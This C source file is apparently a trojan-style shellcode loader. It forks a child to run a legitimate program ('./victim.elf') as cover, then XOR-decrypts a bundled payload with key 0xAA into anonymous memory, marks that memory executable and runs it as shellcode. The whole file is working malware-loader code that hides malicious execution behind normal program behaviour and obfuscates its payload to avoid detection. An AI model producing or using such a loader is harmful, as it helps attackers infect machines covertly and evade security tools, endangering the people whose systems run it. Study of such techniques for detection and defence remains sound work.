#include <unistd.h> 
#include <sys/mman.h> 
#include <sys/wait.h>

#include "encrypted_payload.h"

void legit_behavior(void)
{
	char target[] = "./victim.elf";
	char *argv[] = {
		"./victim.elf", 
		NULL
	};

	execvp(target, argv);

	_exit(0);
}

void load_payload(void)
{
	void *mem; 
	unsigned char *dest; 
	void (*shellcode)(void); 
	unsigned int i; 

	mem = mmap(
		NULL, 
		encrypted_payload_len, 
		PROT_READ | PROT_WRITE, 
		MAP_PRIVATE | MAP_ANONYMOUS, 
		-1, 
		0
	);

	dest = (unsigned char *)mem;
	for (i = 0; i < encrypted_payload_len; i++) {
		dest[i] = encrypted_payload[i] ^ 0xAA;
	}

	mprotect(mem, encrypted_payload_len, PROT_READ | PROT_EXEC);

	shellcode = (void (*)(void))mem; 
	shellcode(); 
}

int main(void)
{
	pid_t pid; 

	pid = fork(); 
	if (pid == 0) {
		legit_behavior(); 
	} else {
		waitpid(pid, NULL, 0);
	}

	load_payload(); 

	return 0; 
}